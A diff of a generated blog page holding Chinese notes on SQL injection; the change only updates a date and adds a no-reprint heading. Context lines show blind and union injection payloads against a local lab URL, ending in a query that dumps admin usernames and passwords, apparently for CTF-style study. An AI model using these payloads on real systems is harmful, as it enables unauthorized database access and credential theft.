@@ -80,7 +80,7 @@
 		</span>
   <p class="article-time">
     <time datetime="2016-10-27T11:53:48.000Z" itemprop="datePublished">2016-10-27</time>
-    更新日期:<time datetime="2016-10-29T15:13:20.202Z" itemprop="dateModified">2016-10-29</time>
+    更新日期:<time datetime="2017-08-12T02:41:22.698Z" itemprop="dateModified">2017-08-12</time>
     
   </p>
 </header>
@@ -96,7 +96,7 @@ select * from admin where id =&apos;123&apos; and ascii(substr((version()),1,1))
 select * from admin where id =&apos;123&apos; and substr((select flag from flag limit 0,1),1,1)=&apos;f&apos;
 </code></pre><p>union注入：<br>    有回显数据 order by 之前<br>    判断 列数<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=123</a>‘ order by  3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,2,3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,version(),3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(table_name),3 from  information_schema.tables where table_schema=database()%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(column_name),3 from  information_schema.columns where table_name=0x61646D696E%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(username,0x5e,password),3 from  admin%23</p>
 <p>sleep benchmark函数的安全问题<br>判断表 字段<br>快速注入：<br>exists(substr((select flag from flag),1,1)=’f’)</p>
-  
+<h2 style="color:red">未经本人允许，禁止转载</h2>  
 	</div>
 		<footer class="article-footer clearfix">
 
@@ -143,7 +143,7 @@ select * from admin where id =&apos;123&apos; and substr((select flag from flag 
 
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
-  
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-number">1.</span> <span class="toc-text">未经本人允许，禁止转载</span></a></li></ol>
   </div>
 
 <div id="asidepart">
